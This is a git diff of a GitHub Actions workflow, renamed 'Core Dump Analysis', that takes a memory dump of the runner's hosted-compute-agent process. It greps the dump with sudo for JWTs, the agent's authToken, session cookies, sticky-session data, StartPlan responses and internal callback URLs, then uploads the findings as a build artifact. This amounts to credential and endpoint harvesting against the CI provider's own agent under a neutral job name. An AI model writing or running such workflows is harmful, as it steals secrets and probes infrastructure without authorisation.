@@ -1,4 +1,4 @@
-name: Heap Dump
+name: Core Dump Analysis
 on:
   push:
     branches: [master]
@@ -13,26 +13,30 @@ jobs:
           HCA_PID=$(pgrep -f hosted-compute-agent)
           echo "PID=$HCA_PID"
           
-          # Install gdb
-          sudo apt-get update -qq 2>/dev/null && sudo apt-get install -y -qq gdb 2>/dev/null
+          # Search for HTTP responses in core dump
+          echo "=== HTTP response bodies ===" > dist/core2.txt
+          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -E "HTTP/|planId|runStampUrl|token|stamp|session" | sort -u | head -30 >> dist/core2.txt
           
-          # Use gcore to dump full memory
-          sudo gcore -o /tmp/hca_core $HCA_PID 2>&1 | tail -5
+          # Search for Set-Cookie or sticky session
+          echo "=== Cookies/Session ===" >> dist/core2.txt
+          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -iE "set-cookie|session|sticky|affinity|node|pod" | sort -u | head -20 >> dist/core2.txt
           
-          # Search for JWT in core dump
-          echo "=== Searching core for JWT patterns ===" > dist/core.txt
-          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -oE "eyJ[A-Za-z0-9_-]+[\.][A-Za-z0-9_-]+[\.][A-Za-z0-9_-]+" | sort -u | head -20 >> dist/core.txt
+          # Search for StartPlan response
+          echo "=== StartPlan response ===" >> dist/core2.txt
+          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -iE "startplan|StartPlan|runStamp|stamp_url" | sort -u | head -20 >> dist/core2.txt
           
-          # Also search for the settings token
-          SETTINGS_TOKEN=$(python3 -c "import json;print(json.load(open('/opt/hca/.settings'))['authToken'][:50])")
-          echo "Looking for: ${SETTINGS_TOKEN:0:30}..." >> dist/core.txt
-          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -o "${SETTINGS_TOKEN:0:30}.*" | head -5 >> dist/core.txt
+          # Look for any URL that's NOT in settings
+          echo "=== Other URLs ===" >> dist/core2.txt
+          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -E "https?://[a-z]" | grep -v "settings\|google\|azure\|githubusercontent\|github.com/actions" | sort -u | head -20 >> dist/core2.txt
           
-          ls -lh /tmp/hca_core.$HCA_PID 2>/dev/null >> dist/core.txt
+          # Search for callback URLs or receiver URLs
+          echo "=== Callback URLs ===" >> dist/core2.txt
+          sudo strings /tmp/hca_core.$HCA_PID 2>/dev/null | grep -E "receiver|callback|result|preJob|permissions" | sort -u | head -20 >> dist/core2.txt
           
-          echo "=== Done ===" >> dist/core.txt
+          echo "=== Done ===" >> dist/core2.txt
+
       - name: Upload
         uses: actions/upload-artifact@v4
         with:
-          name: core-dump
+          name: core-analysis
           path: dist/
